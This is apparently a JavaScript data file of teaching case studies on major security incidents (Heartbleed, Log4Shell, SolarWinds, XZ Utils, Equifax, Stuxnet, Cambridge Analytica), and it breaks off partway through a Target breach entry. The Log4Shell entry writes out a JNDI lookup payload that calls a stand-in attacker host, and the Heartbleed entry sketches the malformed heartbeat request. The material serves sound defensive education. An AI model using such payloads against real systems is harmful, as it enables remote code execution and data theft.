/* Case studies — Breaches & Security. */
TD.addStudies("breaches", [

{
 t: "Heartbleed",
 s: "Two maintainers, one missing bounds check",
 y: 2014, when: "April 2014",
 g: ["openssl", "memory safety", "tls", "open source"],
 tldr: "A missing length check in OpenSSL's TLS heartbeat extension let anyone ask a server for up to 64KB of its own memory, repeatedly, leaving no trace in any log. Private keys, session cookies and passwords were all fair game, on roughly 17% of the internet's secure web servers. The bug had been live for two years, and the aftermath revealed that the library securing most of the internet was maintained by a couple of people on about $2,000 a year in donations.",
 say: [
  "The mechanism is simple enough to explain in one sentence: you say *send me back 64KB* while sending one byte, and the server trusts your number.",
  "It left no trace — there was no log entry for a heartbeat request, so nobody could tell whether they had been exploited.",
  "It was the first vulnerability with a logo, a name and a website, and that branding genuinely changed how quickly people patched.",
  "The real legacy is funding: it exposed that critical infrastructure was maintained by volunteers, which led to the Core Infrastructure Initiative."
 ],
 b: [
  { h: "The bug" },
  { p: "TLS has a heartbeat extension: a keep-alive where one side sends a small payload and the other echoes it back, to confirm the connection is still live. The request contains the payload and, separately, a number saying how long that payload is." },
  { p: "OpenSSL's implementation allocated a response buffer using the *claimed* length and copied that many bytes from the location of the received payload. It never checked whether the claimed length matched the actual length received." },
  { x: { lang: "text", code:
"Attacker sends:   payload = \"bird\"   claimed length = 65535\n\nServer does:      allocate 65535 bytes\n                  memcpy(response, payload_ptr, 65535)\n                  send(response)\n\nServer returns:   \"bird\" + 65531 bytes of whatever\n                  happened to be next in memory" } },
  { p: "That adjacent memory was whatever the process had recently been handling: decrypted request bodies, session cookies, usernames and passwords, and — because it lives in the same process — potentially the server's own TLS private key. An attacker could repeat the request indefinitely, getting a fresh 64KB slice each time." },
  { n: "There was no log entry for a heartbeat request and no anomaly to detect. After disclosure, essentially every affected operator had to assume compromise and act accordingly — revoke and reissue certificates, invalidate all sessions, force password resets — because proving you had *not* been exploited was impossible.",
    nt: "Undetectable is worse than severe" },

  { h: "How long it was live" },
  { tl: [
    { t: "Dec 2011", d: "The heartbeat implementation is committed to OpenSSL, reviewed and merged." },
    { t: "Mar 2012", d: "OpenSSL 1.0.1 ships with the vulnerable code. It becomes the default in major Linux distributions." },
    { t: "Mar 2014", d: "Neel Mehta of Google discovers the flaw. Independently, Codenomicon finds it while testing their own product." },
    { t: "7 Apr 2014", d: "Public disclosure, with the name, the logo and heartbleed.com. OpenSSL 1.0.1g ships the same day." },
    { t: "Following weeks", d: "Mass certificate reissuance and revocation — large enough to visibly stress the certificate revocation infrastructure." }
  ] },

  { h: "Why it mattered beyond the bug" },
  { p: "The vulnerability itself was a straightforward memory-safety failure of a kind that C makes easy and that a memory-safe language would have prevented outright. The uncomfortable part was organisational." },
  { l: [
   "OpenSSL secured a large share of the internet's TLS traffic and had roughly one full-time-equivalent developer.",
   "The project's annual donations were in the region of $2,000. Companies with billion-dollar revenues depended on it and contributed nothing.",
   "The *many eyes make all bugs shallow* argument had been widely used to justify trusting open source security code. Two years of exposure in the most scrutinised security library in the world undercut it.",
   "In response, the Linux Foundation launched the Core Infrastructure Initiative, with funding from Amazon, Google, Microsoft, IBM, Intel and others, to pay for maintenance of critical open source projects. OpenBSD forked OpenSSL into LibreSSL to aggressively remove legacy code."
  ] },

  { h: "What changed" },
  { p: "Certificate lifetimes shortened and automated reissuance became normal, which contributed to the environment Let's Encrypt launched into the following year. Forward secrecy moved from a nice-to-have to a default, because it limits what a stolen private key retroactively unlocks. And funding open source infrastructure became a recognised corporate responsibility rather than an act of charity — a conversation that Log4Shell and the XZ backdoor would each reopen." }
 ],
 k: [
  "Never trust a length supplied by the other side; validate it against what you actually received.",
  "A vulnerability that leaves no trace forces everyone to assume the worst, which multiplies the cost.",
  "Widespread use is not the same as widespread review.",
  "Memory-unsafe languages make this specific class of bug a permanent tax on the ecosystem."
 ],
 r: ["Buffer Overflow", "Memory Safety", "TLS", "Public-Key Cryptography", "Open Source", "CVE", "Authentication", "Zero-Day"],
 src: [
  { t: "CVE-2014-0160 — National Vulnerability Database", u: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" },
  { t: "heartbleed.com — the original disclosure site", u: "https://heartbleed.com/" }
 ]
},

{
 t: "Log4Shell",
 s: "A log line that runs code",
 y: 2021, when: "December 2021",
 g: ["java", "rce", "dependencies", "sbom"],
 tldr: "Log4j, the default logging library across the Java ecosystem, would interpret special syntax inside the strings it was asked to log — including a directive to fetch and execute a Java class from a remote server. Logging a username was enough. It scored the maximum 10.0 on CVSS, could be triggered by putting a string in a User-Agent header or a Minecraft chat message, and nobody could immediately tell where they had Log4j because it arrived as a transitive dependency.",
 say: [
  "The one-liner: Log4j evaluated `${…}` expressions inside the text it was logging, and one of the supported expressions did a remote class load.",
  "It was trivially exploitable — change your iPhone's name, put it in a HTTP header, type it in a game chat, and it would land in someone's logs.",
  "The hard part was not patching, it was inventory: nobody had a list of where Log4j was, because it came in through other dependencies.",
  "It is the single biggest reason SBOMs went from a compliance checkbox to something engineering teams actually care about."
 ],
 b: [
  { h: "The mechanism" },
  { p: "Log4j 2 supports **message lookup substitution** — placeholders inside a log message that get resolved at logging time, such as `${java:version}`. One of the supported lookups was JNDI, the Java Naming and Directory Interface, which can resolve a name against a remote directory service over LDAP or RMI." },
  { p: "If the resolved object was a reference to a remote class, older JDK configurations would fetch and instantiate it. So the following sequence was enough:" },
  { x: { lang: "text", code:
"1. Attacker sends any input that will be logged, containing:\n     ${jndi:ldap://attacker.example/a}\n\n2. Application logs it:\n     log.info(\"Login failed for user {}\", username);\n\n3. Log4j resolves the lookup, contacts attacker.example,\n   fetches a class file, and executes it.\n\n   Remote code execution, as the application user." } },
  { n: "The vulnerable input did not need to reach a form field or an API parameter. It only needed to reach a log statement. User-Agent headers, HTTP referrers, usernames on failed logins, filenames, chat messages, and — famously — the name of an iPhone appearing in a device list were all viable delivery paths.",
    nt: "Any input that gets logged is an attack surface" },

  { h: "Why the response was so painful" },
  { p: "Log4j is not usually a dependency you chose. It arrives underneath a framework, which arrived underneath another library. Teams ran their build tools and found Log4j three or four levels deep in dependency trees they had never inspected." },
  { l: [
   "Java applications are frequently packaged as fat JARs or WARs with dependencies bundled, so scanning source manifests was insufficient — you had to scan artefacts.",
   "Vendors had to audit their own products, and customers had to wait on vendor patches for appliances and closed-source software they could not inspect.",
   "The first patch, 2.15.0, was found to be incomplete, followed by 2.16.0 and then 2.17.0 for further issues. Teams patched three times in a fortnight.",
   "Because attacks were trivial to automate, mass scanning of the internet began within hours of disclosure."
  ] },
  { tl: [
    { t: "24 Nov 2021", d: "Chen Zhaojun of Alibaba Cloud reports the vulnerability to the Apache Software Foundation." },
    { t: "9 Dec 2021", d: "A working exploit circulates publicly. Mass scanning begins almost immediately." },
    { t: "10 Dec 2021", d: "CVE-2021-44228 is published with a CVSS score of 10.0. Log4j 2.15.0 released." },
    { t: "13–18 Dec 2021", d: "Follow-up releases 2.16.0 and 2.17.0 address further issues found under scrutiny." },
    { t: "Into 2022", d: "US CISA issues emergency directives; the incident becomes a reference point in software supply chain policy." }
  ] },

  { h: "What changed" },
  { l: [
   "**SBOMs became real.** A Software Bill of Materials — a machine-readable inventory of everything in a build — moved from a policy aspiration to something organisations actually generate and query. The first question in the incident was *do we have it*, and almost nobody could answer.",
   "**Dependency scanning moved into CI.** Not as a periodic audit but as a gate, with the ability to answer *which of our services ship this library, at which version* in minutes.",
   "**Feature surface got scrutiny.** Log4j's lookup feature was doing something few users knew existed and almost none needed. *What else does this dependency do that we never asked for* became a legitimate review question.",
   "**Funding, again.** As with Heartbleed, a piece of critical infrastructure maintained by a small volunteer team had held up an enormous share of global software."
  ] }
 ],
 k: [
  "User input reaching a log statement is user input reaching your system.",
  "You cannot patch what you cannot locate — dependency inventory is a prerequisite for incident response.",
  "Transitive dependencies carry features you never evaluated and would not have chosen.",
  "Expect follow-up releases; the first patch under emergency pressure is often incomplete."
 ],
 r: ["Dependency", "Supply Chain Attack", "CVE", "Zero-Day", "Logging", "Endpoint", "Sandboxing", "Principle of Least Privilege"],
 src: [
  { t: "CVE-2021-44228 — National Vulnerability Database", u: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
  { t: "Apache Log4j Security Vulnerabilities", u: "https://logging.apache.org/log4j/2.x/security.html" }
 ]
},

{
 t: "SolarWinds",
 s: "When the build system is the target",
 y: 2020, when: "December 2020",
 g: ["supply chain", "nation state", "build pipeline", "signing"],
 tldr: "Attackers compromised SolarWinds' build system and inserted a backdoor into the Orion network-monitoring product. The malicious code was compiled into official releases and signed with SolarWinds' own certificate, so every downstream check passed. Around 18,000 organisations installed it; a smaller, deliberately chosen subset — including US federal agencies — were then actively exploited. It had been running for months before anyone noticed.",
 say: [
  "The key idea: they did not attack the product, they attacked the pipeline that builds the product.",
  "Everything downstream was valid — the signature checked out, because SolarWinds really did sign it.",
  "It was found by FireEye noticing an unexplained second device enrolled for 2FA on an employee account, not by any scanner.",
  "It is the reason build provenance, reproducible builds and frameworks like SLSA became mainstream conversations."
 ],
 b: [
  { h: "What happened" },
  { p: "SolarWinds Orion is network and infrastructure monitoring software. By its nature it runs with broad privileges and wide network visibility — exactly the position an attacker would want." },
  { p: "Rather than finding a vulnerability in Orion, the attackers gained access to SolarWinds' internal build environment and inserted code into the build process itself. When SolarWinds compiled Orion, the backdoor — later named **SUNBURST** — was baked into the resulting binary, which was then signed with SolarWinds' legitimate code-signing certificate and shipped through normal update channels." },
  { n: "Code signing answers the question *did this come from the vendor and arrive unmodified*. Here the answer was genuinely yes. The signature was valid because the vendor really did build and sign it. Signing verifies the channel, not the contents — and this incident is what made that distinction concrete for a lot of engineers.",
    nt: "Signed does not mean safe" },

  { h: "The tradecraft" },
  { l: [
   "SUNBURST stayed dormant for up to two weeks after installation before doing anything, defeating short-window sandbox analysis.",
   "It checked for analysis tools and known security-vendor environments and stayed inert if it found them.",
   "It used a domain generation algorithm and communicated over a protocol designed to look like Orion's own legitimate telemetry traffic.",
   "Of roughly 18,000 organisations that installed the trojanised update, the attackers selected a much smaller number — reported as fewer than 100 — for the second-stage intrusion. Broad distribution, narrow exploitation."
  ] },
  { tl: [
    { t: "Sept 2019", d: "Attackers access the SolarWinds build environment and test their ability to inject code." },
    { t: "Feb–Jun 2020", d: "SUNBURST is included in Orion builds and distributed through official updates." },
    { t: "Through 2020", d: "Selected targets are exploited, including US Treasury, Commerce, Homeland Security and multiple technology firms." },
    { t: "Dec 2020", d: "FireEye investigates an anomalous second-factor enrolment on an employee account, discovers its own red-team tooling has been stolen, traces the intrusion to Orion, and discloses publicly." }
  ] },

  { h: "How it was actually found" },
  { p: "No scanner caught it. FireEye's security team noticed that an employee had registered an additional device for two-factor authentication — a small, unexplained anomaly. Investigating that led them to a full compromise of their own network, and from there to the Orion software they, like thousands of others, were running." },
  { p: "The detection came from someone taking a minor authentication anomaly seriously enough to chase it. That is a recurring pattern in supply chain discovery: the XZ backdoor four years later was found the same way, by an engineer investigating an unexplained half-second of latency." },

  { h: "What changed" },
  { l: [
   "**Build integrity became a security boundary.** Hardening CI/CD, isolating build machines, and restricting who can modify build definitions moved into mainstream threat models.",
   "**Reproducible builds** gained real traction — if independent parties can rebuild from source and get a bit-identical artefact, injected code becomes detectable.",
   "**SLSA** (Supply-chain Levels for Software Artifacts) and in-toto attestation emerged to describe and verify provenance: not just *who signed this* but *what source and what process produced it*.",
   "**US Executive Order 14028** (May 2021) required federal software suppliers to provide SBOMs and meet secure development standards, pulling the whole industry along with it."
  ] }
 ],
 k: [
  "A valid signature proves origin, not integrity of intent — the build system is inside your trust boundary.",
  "Broad distribution with narrow exploitation is a deliberate strategy for staying hidden.",
  "Detection came from a small unexplained anomaly that someone chose to investigate.",
  "Provenance — what source and what process produced this artefact — is a stronger guarantee than signing alone."
 ],
 r: ["Supply Chain Attack", "CI/CD", "Artifact", "Authentication", "Zero Trust", "Observability", "Incident Response", "Container Registry"],
 src: [
  { t: "CISA — Emergency Directive 21-01, Mitigate SolarWinds Orion Code Compromise", u: "https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise" },
  { t: "SLSA — Supply-chain Levels for Software Artifacts", u: "https://slsa.dev/" }
 ]
},

{
 t: "The XZ Utils Backdoor",
 s: "Three years of patience, caught by 500 milliseconds",
 y: 2024, when: "March 2024",
 g: ["supply chain", "social engineering", "open source", "maintainer burnout"],
 tldr: "An attacker spent roughly three years building a reputation as a helpful contributor to xz, a compression library present on virtually every Linux system, eventually becoming co-maintainer. They then shipped an obfuscated backdoor — present in the release tarballs but not the git repository — that hooked SSH authentication to allow remote access. It was caught weeks before reaching stable distributions by a database engineer who noticed logins were half a second slower than they should be.",
 say: [
  "The attack was not technical, it was social: three years of legitimate contributions to earn commit rights.",
  "The backdoor was in the release tarball, not in git — so reading the repository would not have shown it.",
  "Andres Freund found it because SSH logins were taking about 500ms longer than expected and he was curious enough to profile it.",
  "The uncomfortable part is that the pressure campaign exploited a burnt-out solo maintainer, which describes an enormous amount of critical infrastructure."
 ],
 b: [
  { h: "The long game" },
  { p: "xz and its library liblzma provide XZ compression. They are unglamorous, extremely widely installed, and were maintained by essentially one person, Lasse Collin, on an unpaid basis." },
  { tl: [
    { t: "2021", d: "An account under the name *Jia Tan* begins contributing to xz and related projects. The contributions are legitimate and useful." },
    { t: "2022", d: "Pressure appears on the mailing list from several accounts complaining about slow patch review and urging that another maintainer be added. Collin, who had publicly mentioned mental health difficulties and limited time, gradually grants more responsibility." },
    { t: "2023", d: "Jia Tan is committing releases. Changes appear that make later concealment easier, including modifications to build and test infrastructure." },
    { t: "Feb 2024", d: "Versions 5.6.0 and then 5.6.1 ship containing the backdoor, hidden inside binary test fixture files and assembled during the build." },
    { t: "29 Mar 2024", d: "Andres Freund discloses publicly. Distributions pull the affected versions within hours." }
  ] },

  { h: "How it was hidden" },
  { p: "The malicious code was not visible in the git repository. It was introduced through the **release tarball**, which is generated by the maintainer and is what distributions actually build from. The build scripts in the tarball differed from those in the repository." },
  { l: [
   "The payload was carried inside files presented as corrupted test data for the compression tests — binary blobs where nobody expects readable content.",
   "A modified `configure` step extracted and assembled the payload only when building an RPM or DEB package on x86-64 Linux, so casual builds did not produce it.",
   "The resulting liblzma hooked the symbol resolution used by OpenSSH. Many distributions patch sshd to link against systemd for notification, which pulls in liblzma indirectly — so a compression library ended up inside the SSH authentication path.",
   "The backdoor checked for a specific attacker key. With it, an attacker could bypass authentication entirely; without it, sshd behaved normally, so black-box testing revealed nothing."
  ] },

  { h: "The 500 milliseconds" },
  { p: "Andres Freund, a PostgreSQL developer working at Microsoft, was running benchmarks and noticed that SSH logins on a Debian testing system were consuming noticeably more CPU than expected and taking around half a second longer. He had also seen some Valgrind errors he could not explain." },
  { q: "I didn't even have a plausible theory of what was going on. I just wanted to know why it was slow.", by: "Andres Freund, on finding the xz backdoor" },
  { p: "He profiled it, traced the CPU time into liblzma, and unpicked the rest. The backdoor was in Debian testing, Fedora Rawhide and other pre-release channels, but had not yet reached stable releases of the major distributions. Had it shipped a few weeks later, it would have been in production on a very large number of servers." },
  { n: "Every account of this incident acknowledges that discovery was luck. A performance-sensitive engineer with the skills to profile a shared library happened to be running a pre-release distribution and happened to be curious about a delay most people would never notice. That is not a security control.",
    nt: "It was found by accident" },

  { h: "What changed" },
  { l: [
   "**Maintainer burnout became a security topic.** The pressure campaign is a documented technique now, and *is this project maintained by one exhausted volunteer* is a supply chain risk question.",
   "**Tarball-versus-repository divergence** got attention. Building from the git tag rather than the generated tarball, and reproducible builds that make the two comparable, moved up the agenda.",
   "**Binary test fixtures** are now viewed with more suspicion — opaque files in a source tree are a place to hide things.",
   "**Dependency depth into sshd** surprised a lot of people. The chain from a compression library to the authentication path ran through distribution-specific patching that few had traced."
  ] }
 ],
 k: [
  "Commit access is earned socially, and that process can be attacked over years.",
  "What distributions build is the release tarball, which is not necessarily what is in the repository.",
  "A solo unpaid maintainer of critical infrastructure is a structural risk, not a personal failing.",
  "Detection here was a performance anomaly investigated out of curiosity — build systems that make divergence detectable are the actual control."
 ],
 r: ["Supply Chain Attack", "Open Source", "SSH", "Authentication", "CVE", "Dependency", "Compiler", "Zero Trust"],
 src: [
  { t: "CVE-2024-3094 — National Vulnerability Database", u: "https://nvd.nist.gov/vuln/detail/CVE-2024-3094" },
  { t: "Andres Freund — original disclosure, oss-security mailing list", u: "https://www.openwall.com/lists/oss-security/2024/03/29/4" }
 ]
},

{
 t: "The Equifax Breach",
 s: "One unpatched server, 147 million people",
 y: 2017, when: "May–July 2017",
 g: ["patching", "asset inventory", "certificates", "detection"],
 tldr: "A known Apache Struts vulnerability with a patch available in March went unpatched on one Equifax server because the company's scan did not find it. Attackers used it in May and stayed for 76 days. They were not detected because an expired certificate had left a network inspection device blind for nineteen months; within minutes of the certificate being renewed, the exfiltration was visible. Personal data on 147 million people was taken.",
 say: [
  "The vulnerability was public and patched two months before the intrusion — this was a patch management and asset inventory failure, not a zero-day.",
  "The detail everyone remembers: an expired certificate meant their traffic inspection had been blind for 19 months, and renewing it immediately revealed the breach.",
  "It is the standard example of why detection matters as much as prevention — the intrusion lasted 76 days.",
  "The settlement was around $700 million, and the CEO, CIO and CSO all left."
 ],
 b: [
  { h: "The way in" },
  { p: "Apache Struts is a Java web framework. In March 2017, CVE-2017-5638 was disclosed: a flaw in how Struts parsed the `Content-Type` header allowed remote code execution. A patch was released the same day, and the vulnerability was widely publicised — it was actively exploited within days." },
  { p: "Equifax circulated an internal notice to patch. The scan run to confirm compliance did not detect the vulnerable installation on a consumer dispute portal, and that server remained unpatched. The company did not have a complete, authoritative inventory of where Struts was deployed." },

  { h: "76 days inside" },
  { tl: [
    { t: "7 Mar 2017", d: "CVE-2017-5638 disclosed with a patch available." },
    { t: "9 Mar 2017", d: "Equifax circulates an internal patching notice." },
    { t: "15 Mar 2017", d: "Scans run to verify patching. They do not find the vulnerable server." },
    { t: "13 May 2017", d: "Attackers exploit the unpatched portal and gain access." },
    { t: "May–Jul 2017", d: "Attackers move through the network, locate unencrypted credentials in a file share, and use them to reach 48 databases. Queries and exfiltration continue for weeks." },
    { t: "29 Jul 2017", d: "An expired certificate on a traffic-inspection device is renewed. Inspection resumes and the exfiltration is immediately visible. Access is cut the next day." },
    { t: "7 Sep 2017", d: "Equifax discloses publicly." }
  ] },

  { h: "The certificate" },
  { p: "Equifax used a device that decrypted and inspected outbound network traffic. To do that it needed a valid certificate. That certificate had expired nineteen months earlier and had not been renewed, so the device was passing traffic through without inspecting it." },
  { n: "A security control that silently stops working is worse than one you never had, because it occupies the space in your architecture diagram where a working control should be. Certificate and licence expiry belongs on the same monitoring footing as disk space — and every control should emit a heartbeat proving it is doing something, not merely that the process is running.",
    nt: "Controls that fail silently" },
  { p: "When the certificate was finally renewed on 29 July, staff saw suspicious traffic within a very short time. The detection capability had existed the whole time. It had simply been switched off by an administrative oversight nobody was monitoring." },

  { h: "What compounded it" },
  { l: [
   "Credentials for database access were stored unencrypted on a file share reachable from the compromised server, which turned a single web-server compromise into access to dozens of databases.",
   "Network segmentation was insufficient — the dispute portal should not have had a path to that data.",
   "Data was retained far beyond what was needed, so the exposure included records on people who had no active relationship with Equifax.",
   "The public response went badly: a hastily built response site on a look-alike domain, confusion over whether using it waived legal rights, and executives selling shares before disclosure."
  ] },
  { p: "The final scope was around 147 million people — names, dates of birth, addresses, and Social Security numbers, plus credit card numbers for a smaller subset. The 2019 FTC settlement was worth at least $575 million and potentially up to $700 million." },

  { h: "What changed" },
  { p: "Patch management and asset inventory got board-level attention in a way they had not before: you cannot patch what you do not know you run. Certificate lifecycle monitoring became standard tooling. And segmentation plus credential hygiene — no plaintext credentials on shares, least privilege between tiers — moved from best practice toward baseline expectation, particularly in regulated data businesses." }
 ],
 k: [
  "An incomplete asset inventory turns a patched vulnerability into an unpatched one.",
  "Security controls fail silently; monitor that they are working, not just that they exist.",
  "Time-to-detection often does more damage than the initial vulnerability.",
  "Flat networks and plaintext credentials turn one compromised host into a total compromise."
 ],
 r: ["CVE", "Zero-Day", "Principle of Least Privilege", "Defence in Depth", "Authentication", "TLS", "Monitoring", "Incident Response"],
 src: [
  { t: "US GAO — Actions Taken by Equifax and Federal Agencies in Response to the 2017 Breach", u: "https://www.gao.gov/products/gao-18-559" },
  { t: "FTC — Equifax Data Breach Settlement", u: "https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement" }
 ]
},

{
 t: "Stuxnet",
 s: "The worm that crossed the air gap and destroyed centrifuges",
 y: 2010, when: "2007–2010",
 g: ["cyber weapon", "scada", "zero-day", "nation state"],
 tldr: "A worm of unprecedented sophistication targeted Iran's uranium enrichment facility at Natanz. It spread via USB drives across air-gapped networks, used four zero-day exploits and stolen digital certificates, and reprogrammed Siemens PLCs to spin centrifuges at destructive speeds while reporting normal telemetry to the operators. It destroyed roughly 1,000 centrifuges and set Iran's nuclear programme back by an estimated one to two years. It is the first confirmed case of a cyber weapon causing physical destruction.",
 say: [
  "It used four zero-day exploits simultaneously — an unheard-of expenditure of offensive capability for a single operation.",
  "It jumped the air gap via infected USB drives, which means physically isolated networks are not as isolated as people assume.",
  "The PLC manipulation was the breakthrough: it changed centrifuge speeds while replaying normal telemetry to the control room, so operators saw nothing wrong.",
  "It was almost certainly a joint US-Israeli operation (codenamed Olympic Games), though neither government has officially confirmed it."
 ],
 b: [
  { h: "What it targeted" },
  { p: "Iran's Natanz uranium enrichment facility used Siemens S7-300 series PLCs (Programmable Logic Controllers) to control the speed of gas centrifuges used to enrich uranium. The centrifuges are physically delicate — they spin at supersonic rim speeds, and small variations in frequency can cause them to fail catastrophically." },
  { p: "The facility was air-gapped — not connected to the internet. The attackers needed the malware to cross that gap, find the specific Siemens controllers among all possible targets worldwide, and manipulate the enrichment process without being detected." },

  { h: "How it worked" },
  { l: [
   "**Propagation.** The worm spread via USB drives and Windows network shares, using four zero-day exploits including a Windows Shell LNK vulnerability and a print spooler flaw. It used stolen digital certificates from Realtek and JMicron to sign its drivers, so Windows loaded them without warning.",
   "**Target identification.** On each machine, Stuxnet checked for Siemens Step 7 software and specific PLC configurations. If it did not find the exact target environment, it did nothing destructive — it only spread further.",
   "**PLC manipulation.** When it found the right controllers, it injected code that periodically changed the frequency converter speeds — spinning centrifuges too fast, then too slow, causing mechanical stress and eventual failure.",
   "**Telemetry spoofing.** While manipulating the centrifuges, it recorded normal operating data and replayed it to the monitoring systems, so operators saw healthy readings while equipment was being destroyed."
  ] },
  { n: "The replay attack on the telemetry is the detail that elevates this from a sophisticated worm to something qualitatively different. The operators were looking at their screens, seeing normal values, while the physical process was being sabotaged. It is the digital equivalent of looping a security camera.",
    nt: "They faked the readings" },

  { h: "Discovery" },
  { p: "Stuxnet escaped its intended target — likely through an infected laptop leaving Natanz — and spread to machines worldwide. In June 2010, VirusTotal received a sample from Iran, and Sergey Ulasen at a Belarusian antivirus firm identified it. Symantec and other researchers spent months reverse-engineering it, gradually uncovering the PLC payload." },
  { tl: [
    { t: "2007–2008", d: "Early versions deployed, likely for reconnaissance." },
    { t: "2009–2010", d: "More aggressive variants deployed. Centrifuges at Natanz begin failing at elevated rates." },
    { t: "Jun 2010", d: "Stuxnet is discovered in the wild by antivirus researchers." },
    { t: "Sep 2010", d: "Symantec publishes detailed analysis revealing the PLC payload." },
    { t: "Nov 2010", d: "Iran acknowledges the centrifuge damage. Natanz operations are temporarily halted." }
  ] },

  { h: "What it changed" },
  { l: [
   "It demonstrated that software can cause physical destruction of industrial equipment — crossing the line from espionage to sabotage.",
   "Air-gapped networks are no longer considered inherently secure. USB-based propagation is now a standard threat model for critical infrastructure.",
   "SCADA and ICS (Industrial Control System) security became a field, not an afterthought. Siemens and others invested heavily in PLC security.",
   "It set a precedent for state-sponsored cyber weapons that subsequent operations (Shamoon, NotPetya, Triton) followed.",
   "It raised fundamental questions about the ethics and legality of cyber operations that international law has still not fully resolved."
  ] }
 ],
 k: [
  "Software can cross an air gap via removable media and cause physical destruction.",
  "The most dangerous part was not the exploit chain — it was spoofing the telemetry so operators could not see the damage.",
  "Four zero-days and stolen certificates show what a nation-state budget buys in offensive capability.",
  "Industrial control systems were designed for safety and reliability, not for adversarial environments — and retrofitting security is ongoing."
 ],
 r: ["Zero-Day", "Buffer Overflow", "Firmware", "Defence in Depth", "Supply Chain Attack", "Endpoint", "Encryption"],
 src: [
  { t: "Symantec — W32.Stuxnet Dossier", u: "https://docs.broadcom.com/doc/security-response-w32-stuxnet-dossier-11-en" },
  { t: "Langner — To Kill a Centrifuge: A Technical Analysis of What Stuxnet's Creators Tried to Achieve", u: "https://www.langner.com/to-kill-a-centrifuge/" }
 ]
},

{
 t: "The Cambridge Analytica Scandal",
 s: "An API, a quiz, and 87 million profiles",
 y: 2018, when: "2014–2018",
 g: ["data privacy", "api design", "consent", "ethics"],
 tldr: "A researcher built a Facebook quiz app that collected not just the quiz-taker's data but the data of all their friends — roughly 87 million profiles — through Facebook's Graph API, which permitted this by design. The data was passed to Cambridge Analytica, a political consulting firm, and used for voter profiling. The scandal led to a $5 billion FTC fine against Facebook, GDPR enforcement acceleration, and a fundamental rethinking of API permission models across the industry.",
 say: [
  "The data collection was not a hack — it used Facebook's API exactly as designed. The API let any app access a user's friends' data without those friends' consent.",
  "About 270,000 people installed the quiz app. Through friends-of-friends access, it harvested data on 87 million people.",
  "It is the defining case for why API permission scoping matters — an API that exposes more data than necessary will be misused.",
  "It directly accelerated GDPR enforcement and led to the largest FTC privacy fine in history."
 ],
 b: [
  { h: "The mechanism" },
  { p: "In 2014, Aleksandr Kogan, a researcher at Cambridge University, built a personality quiz app called *thisisyourdigitallife*. About 270,000 Facebook users installed it and granted it access to their profiles." },
  { p: "At the time, Facebook's Graph API v1.0 allowed apps to access not just the installing user's data but also the data of all their Facebook friends — profile information, likes, location and more. The friends had not installed the app and had not consented to data collection. Through this mechanism, the app harvested data on approximately 87 million Facebook users." },
  { n: "This was not a vulnerability. It was a feature. Facebook's API was designed to allow this level of access because it made the platform more useful for developers and drove app ecosystem growth. The scandal is about what happens when an API permission model prioritises developer convenience over user privacy.",
    nt: "It was the API working as designed" },

  { h: "The political use" },
  { p: "Kogan passed the harvested data to Cambridge Analytica, a political consulting firm. Cambridge Analytica used the data to build psychographic profiles of US voters — modelling personality traits from Facebook likes and activity — and used those profiles for targeted political advertising during the 2016 US presidential election and the Brexit referendum." },
  { p: "The effectiveness of the psychographic targeting is debated. What is not debated is that 87 million people's data was collected without their knowledge or consent, transferred to a third party in violation of Facebook's terms of service, and used for purposes none of them had agreed to." },

  { h: "The fallout" },
  { tl: [
    { t: "2014", d: "Data is harvested through the quiz app." },
    { t: "2015", d: "Facebook learns of the data transfer to Cambridge Analytica, asks for deletion, and takes no further action." },
    { t: "Mar 2018", d: "The Guardian and New York Times publish investigations. Christopher Wylie, a former Cambridge Analytica employee, provides detailed testimony." },
    { t: "Apr 2018", d: "Mark Zuckerberg testifies before US Congress." },
    { t: "Jul 2019", d: "FTC fines Facebook $5 billion — the largest privacy fine ever imposed." },
    { t: "2018–2020", d: "Cambridge Analytica files for bankruptcy. GDPR enforcement accelerates across Europe." }
  ] },

  { h: "What changed for engineers" },
  { l: [
   "**API permissions were restructured.** Facebook restricted the Graph API so apps can only access the installing user's data, not their friends' data. Other platforms followed.",
   "**Principle of least privilege in APIs** became a design requirement, not a suggestion. Ask for the minimum data needed, scope access tightly.",
   "**Consent became a first-class engineering concern.** GDPR's requirement for informed, specific, unambiguous consent changed how permission dialogs are designed.",
   "**Data portability and deletion** became required features, not nice-to-haves. Users must be able to see what data an app has and request its removal.",
   "**Ethics in tech** entered university curricula. The case is now standard in CS ethics courses."
  ] }
 ],
 k: [
  "An API that exposes more data than necessary will eventually be used to harvest it.",
  "Friends-of-friends data access means one user's consent decision affects millions.",
  "Detecting policy violations (data transfer to third parties) is much harder than preventing them through API design.",
  "The cost of not building privacy into the API was $5 billion and a permanent loss of public trust."
 ],
 r: ["API", "Authentication", "Principle of Least Privilege", "GDPR", "OAuth 2.0", "Zero Trust"],
 src: [
  { t: "The Guardian — Cambridge Analytica Files", u: "https://www.theguardian.com/news/series/cambridge-analytica-files" },
  { t: "FTC — FTC Imposes $5 Billion Penalty on Facebook (2019)", u: "https://www.ftc.gov/news-events/news/press-releases/2019/07/ftc-imposes-5-billion-penalty-one-sweeping-new-privacy-restrictions-facebook" }
 ]
},

{
 t: "The Target Data Breach",
 s: "From the HVAC vendor to 40 million credit cards",
 y: 2013, when: "November–December 2013",
 g: ["lateral movement", "third party", "segmentation", "pos"],
 tldr: "Attackers stole credentials from Fazio Mechanical, a small HVAC contractor that had network access to Target for billing and project management. Using those credentials, they moved laterally through Target's network to the point-of-sale systems, installed memory-scraping malware, and exfiltrated data on 40 million credit and debit cards plus personal information on 70 million customers. The total cost exceeded $200 million. It is the standard case study for third-party risk and network segmentation.",
 say: [
  "The entry point was an HVAC contractor's stolen credentials — not a sophisticated zero-day, not even a Target employee.",
  "The HVAC vendor had access to the same network segment as the POS systems, which is the segmentation failure that made it possible.",
  "The POS malware scraped card data from RAM in the brief moment between the card swipe and encryption — a technique called RAM scraping.",
  "FireEye's security system actually detected the malware and generated alerts. The alerts were not acted on."
 ],
 b: [
  { h: "The kill chain" },
  { p: "Fazio Mechanical was a refrigeration and HVAC contractor that worked with Target. Like many vendors, it had remote access to Target's network for electronic billing, contract submission and project management. The attackers compromised Fazio's systems — likely through a phishing email — and stole the vendor credentials." },
  { tl: [
    { t: "Late Nov 2013", d: "Attackers use Fazio Mechanical's credentials to access Target's network." },
    { t: "Nov–Dec 2013", d: "Lateral movement through the network. Attackers reach POS systems." },
